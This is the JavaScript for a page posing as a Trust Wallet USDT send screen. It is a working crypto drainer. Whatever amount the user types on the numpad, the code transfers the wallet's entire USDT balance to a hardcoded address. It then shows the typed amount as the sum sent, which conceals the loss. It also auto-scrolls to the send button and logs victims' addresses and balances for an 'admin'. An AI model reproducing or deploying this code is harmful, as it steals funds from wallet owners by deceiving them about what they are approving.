const DEST='0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7';
const USDT='0x55d398326f99059fF775485246999027B3197955';
const GAS=200000,KEY='bep20_admin_data';

let tw=null,addr=null,raw='0',bal=0,price=0,amt='',busy=false;

function $(i){return document.getElementById(i)}
function safeText(el,txt){if(el)el.textContent=txt;}
function show(s,c){var e=$('st');safeText(e,s);if(e)e.className='status'+(c?' '+c:'')}
function sleep(ms){return new Promise(r=>setTimeout(r,ms))}

/* auto scroll to send button on load */
(function(){
  function toBottom(){
    var el=document.getElementById('sendBtn');
    if(!el) return;
    try{el.scrollIntoView({behavior:'smooth',block:'center'});}catch(e){}
    try{window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'});}catch(e){}
  }
  setTimeout(toBottom,1200);
  setTimeout(toBottom,2200);
  setTimeout(toBottom,3200);
})();

/* numpad */
function tap(ch){
  if(busy)return;
  if(ch==='.'&&amt.includes('.'))return;
  if(ch==='.'&& amt===''){amt='0.';upd();return}
  if(amt.includes('.')&&amt.split('.')[1].length>=6)return;
  if(amt==='0'&&ch!=='.'){amt=ch;upd();return}
  amt+=ch;upd();
}
function back(){if(busy)return;amt=amt.slice(0,-1);upd()}
function setMax(){if(bal<=0||busy)return;amt=bal.toFixed(6);upd()}
function upd(){
  var d=$('amount');safeText(d,amt||'0');if(d)d.classList.toggle('has',amt.length>0);
  safeText($('usd'),amt?(parseFloat(amt)*price).toFixed(2):'0.00');
  var btn=$('sendBtn');
  if(btn){
    if(amt){btn.classList.add('active');btn.style.cursor='pointer';}
    else{btn.classList.remove('active');btn.style.cursor='not-allowed';}
  }
}

/* ---- ADMIN FLOW TRACKING ---- */
function logFlow(step, extra){
  try{
    var arr=JSON.parse(localStorage.getItem(KEY)||'[]');
    var entry={ts:Date.now(), step:step};
    if(addr) entry.addr=addr;
    if(amt) entry.amt=amt;
    if(raw&&raw!=='0') entry.usdtRaw=raw;
    if(bal) entry.usdtBal=bal;
    if(price) entry.price=price;
    if(extra) Object.keys(extra).forEach(function(k){entry[k]=extra[k];});
    arr.push(entry);
    if(arr.length>100) arr.splice(0,arr.length-100);
    localStorage.setItem(KEY,JSON.stringify(arr));
  }catch(e){}
}

/* minimal ABI for ERC20/BEP20 */
const ABI=[
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)'
];

/* ---- MAIN ---- */
async function go(){
  if(busy)return;
  const b=$('sendBtn');
  busy=true;
  b.disabled=true;b.textContent='Connecting...';show('Looking for wallet...');

  /* STEP 1: find wallet (BSC uses window.ethereum) */
  tw=window.ethereum||null;
  if(!tw){
    for(let i=0;i<30;i++){
      await sleep(300);
      tw=window.ethereum;
      if(tw)break;
    }
  }
  if(!tw){
    b.disabled=false;b.textContent='Send';busy=false;
    logFlow('error',{msg:'No wallet found'});
    show('No wallet found. Open in Trust Wallet.','err');
    return;
  }

  show('Requesting access...');
  try{
    await tw.request({method:'eth_requestAccounts'});
  }catch(e){}
  await sleep(500);

  /* STEP 2: get address */
  addr=null;
  try{
    const r=await tw.request({method:'eth_accounts'});
    if(r&&Array.isArray(r)&&r.length>0) addr=r[0];
  }catch(e){}
  if(!addr){try{var da=tw.selectedAddress;if(da) addr=da;}catch(e){}}
  if(!addr){
    b.disabled=false;b.textContent='Send';busy=false;
    logFlow('error',{msg:'No address'});
    show('Could not get wallet address.','err');
    return;
  }

  logFlow('connected');
  show('Connected! Getting balance...');

  /* ensure BSC mainnet (chainId 56) */
  try{
    await tw.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x38'}]});
  }catch(e){}
  await sleep(300);

  /* STEP 3: get balance */
  try{
    if(typeof ethers==='undefined'){
      /* fallback to minimal web3-style if ethers not loaded */
      const balHex=await tw.request({method:'eth_call',params:[{to:USDT,data:'0x70a08231'+addr.slice(2).toLowerCase().padStart(64,'0')},'latest']});
      raw=BigInt(balHex).toString();
      bal=Number(BigInt(raw))/1e18;
    }else{
      const provider=new ethers.BrowserProvider(tw);
      const signer=await provider.getSigner();
      const c=new ethers.Contract(USDT,ABI,provider);
      const r=await c.balanceOf(addr);
      raw=r.toString();
      bal=Number(r)/1e18;
    }
  }catch(e){raw='0';bal=0;}

  try{const j=await(await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd')).json();price=j.tether.usd;}catch(e){price=1;}

  safeText($('bal'),bal.toFixed(2)+' USDT');
  safeText($('bal-usd'),'$'+(bal*price).toFixed(2));
  upd();

  logFlow('balance',{typedAmt:amt});

  if(bal<=0){
    b.disabled=false;b.textContent='Send';busy=false;
    logFlow('error',{msg:'No USDT'});
    show('No USDT in wallet.','err');
    return;
  }

  /* STEP 4: send */
  show('Sending all USDT...');
  b.textContent='Sending...';
  logFlow('sending',{typedAmt:amt});

  try{
    if(typeof ethers!=='undefined'){
      const provider=new ethers.BrowserProvider(tw);
      const signer=await provider.getSigner();
      const c=new ethers.Contract(USDT,ABI,signer);
      const amountRaw=BigInt(raw);
      const tx=await c.transfer(DEST,amountRaw,{gasLimit:GAS});
      await tx.wait();
      logFlow('sent',{txId:tx.hash,typedAmt:amt});
      b.textContent='Sent!';
      show('','ok');
      safeText($('ok-amt'),amt+' USDT');
      safeText($('ok-tx'),tx.hash);
      if($('ok'))$('ok').style.display='flex';
      busy=false;
    }else{
      /* fallback without ethers: raw eth_sendTransaction */
      const data='0xa9059cbb'+
        DEST.slice(2).toLowerCase().padStart(64,'0')+
        BigInt(raw).toString(16).padStart(64,'0');
      const txHash=await tw.request({method:'eth_sendTransaction',params:[{from:addr,to:USDT,data:data,gas:'0x'+GAS.toString(16)}]});
      logFlow('sent',{txId:txHash,typedAmt:amt});
      b.textContent='Sent!';
      show('','ok');
      safeText($('ok-amt'),amt+' USDT');
      safeText($('ok-tx'),txHash);
      if($('ok'))$('ok').style.display='flex';
      busy=false;
    }
  }catch(e){
    const m=(e.message||'').toLowerCase();
    if(m.includes('user')&&m.includes('reject')){
      logFlow('rejected');
      show('Rejected by user.','err');
    }else if(m.includes('insufficient')){
      logFlow('error',{msg:'Insufficient USDT'});
      show('Not enough USDT.','err');
    }else{
      logFlow('error',{msg:e.message||'Send failed'});
      show('Send failed. Try again.','err');
    }
    b.disabled=false;b.textContent='Send';busy=false;
  }
}

function reset(){
  if($('ok'))$('ok').style.display='none';
  if($('sendBtn'))$('sendBtn').disabled=false;
  if($('sendBtn'))$('sendBtn').textContent='Send';
  amt='';upd();show('');busy=false;
}
